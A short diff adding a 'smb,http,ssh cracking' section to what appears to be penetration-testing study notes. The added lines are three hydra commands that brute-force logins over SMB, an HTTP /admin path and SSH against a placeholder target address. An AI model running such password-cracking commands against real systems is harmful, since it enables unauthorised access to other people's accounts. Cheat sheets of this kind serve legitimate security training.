@@ -88,3 +88,10 @@ ns1.certifiedhacker.com
 ns2.certifiedhacker.com
 ```
 
+# smb,http,ssh cracking
+```
+hydra -L usernames.txt -P passwords.txt $ip smb -V -f
+hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin
+hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
+```
+
